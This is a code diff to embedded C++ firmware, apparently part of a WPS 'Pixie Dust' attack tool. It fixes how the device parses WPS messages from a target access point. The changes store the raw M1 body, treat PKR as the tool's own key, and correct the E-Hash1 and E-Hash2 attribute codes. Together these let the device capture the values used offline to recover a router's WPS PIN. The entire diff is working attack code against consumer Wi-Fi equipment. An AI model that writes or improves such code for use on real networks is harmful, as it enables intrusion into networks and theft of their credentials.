@@ -302,6 +302,39 @@ static bool parseTlvBuffer(const uint8_t *buf, int bufLen) {
         Serial.printf("[Debug-Parse] Hex TLV buffer start: %02X %02X %02X %02X %02X %02X\n",
                     buf[0], buf[1], buf[2], buf[3], buf[4], buf[5]);
     }
+
+    // Check MsgType early so we can store the raw M1 body for Authenticator computation.
+    // MsgType TLV (0x1022) is near the start of every WPS message.
+    uint8_t msgType = 0;
+    {
+        int o = 0;
+        while (o + 4 <= bufLen) {
+            uint16_t t = ((uint16_t)buf[o]<<8)|buf[o+1];
+            uint16_t l = ((uint16_t)buf[o+2]<<8)|buf[o+3];
+            if (t == 0x1022 && l >= 1) { msgType = buf[o+4]; break; }
+            if (o + 4 + l > bufLen) break;
+            o += 4 + l;
+        }
+    }
+    // MsgType 0x04 = M1 (AP→us in Registrar flow). Store raw body for Authenticator.
+    // Walk TLVs to find the exact end — bufLen may include trailing padding bytes
+    // that would corrupt the HMAC input if included.
+    if (msgType == 0x04 && pixieCapture.m1BodyLen == 0) {
+        int exactLen = 0;
+        int p = 0;
+        while (p + 4 <= bufLen) {
+            uint16_t t = ((uint16_t)buf[p]<<8) | buf[p+1];
+            uint16_t l = ((uint16_t)buf[p+2]<<8) | buf[p+3];
+            if (p + 4 + l > bufLen) break;
+            exactLen = p + 4 + l;
+            p += 4 + l;
+        }
+        int copyLen = (exactLen < PixieData::M1_BODY_MAX) ? exactLen : PixieData::M1_BODY_MAX;
+        memcpy(pixieCapture.m1Body, buf, copyLen);
+        pixieCapture.m1BodyLen = copyLen;
+        Serial.printf("[Pixie] M1 body stored EXACTLY (%d bytes) for Authenticator\n", copyLen);
+    }
+
     int offset = 0;
     while (offset + 4 <= bufLen) {
         uint16_t attr_type = ((uint16_t)buf[offset] << 8) | buf[offset+1];
@@ -316,18 +349,15 @@ static bool parseTlvBuffer(const uint8_t *buf, int bufLen) {
         const uint8_t *data = buf + offset;
 
         switch (attr_type) {
-            case 0x1032:  // Public Key — used for BOTH enrollee PKE (M1) and registrar PKR (M2)
+            case 0x1032:  // Public Key — AP's PKE (M1). We never sniff our own M2 (fromAP filter).
                           // 0x1032 = ATTR_PUBLIC_KEY per wpa_supplicant wps_defs.h
                 if (attr_len == 192) {
                     if (!pixieCapture.pke_set) {
                         memcpy(pixieCapture.pke, data, 192);
                         pixieCapture.pke_set = true;
                         Serial.println("[Pixie] PKE captured");
-                    } else {
-                        memcpy(pixieCapture.pkr, data, 192);
-                        pixieCapture.pkr_set = true;
-                        Serial.println("[Pixie] PKR captured");
                     }
+                    // PKR is our own key — set by wpsPixieDustProbe(), not captured from wire.
                 }
                 break;
             case 0x101A:  // Enrollee Nonce — in M1
@@ -346,14 +376,14 @@ static bool parseTlvBuffer(const uint8_t *buf, int bufLen) {
                     Serial.println("[Pixie] R-Nonce captured");
                 }
                 break;
-            case 0x1062:  // E-Hash1 — in M2
+            case 0x1014:  // E-Hash1 — in AP M3 (Registrar flow) / Enrollee flow
                 if (attr_len == 32) {
                     memcpy(pixieCapture.e_hash1, data, 32);
                     pixieCapture.e_hash1_set = true;
                     Serial.println("[Pixie] E-Hash1 captured");
                 }
                 break;
-            case 0x1063:  // E-Hash2 — in M2
+            case 0x1015:  // E-Hash2 — in AP M3 (Registrar flow) / Enrollee flow
                 if (attr_len == 32) {
                     memcpy(pixieCapture.e_hash2, data, 32);
                     pixieCapture.e_hash2_set = true;
@@ -371,9 +401,11 @@ static bool parseTlvBuffer(const uint8_t *buf, int bufLen) {
         offset += attr_len;
     }
 
+    // PKR is our own key — set by wpsPixieDustProbe() before the M3 wait loop starts,
+    // so we don't gate on it here. Gating on it would keep valid=false until after
+    // M3 is already received, causing the wait loop to time out.
     bool hasMinimal =
         pixieCapture.pke_set     &&
-        pixieCapture.pkr_set     &&
         pixieCapture.e_hash1_set &&
         pixieCapture.e_hash2_set &&
         pixieCapture.e_nonce_set;
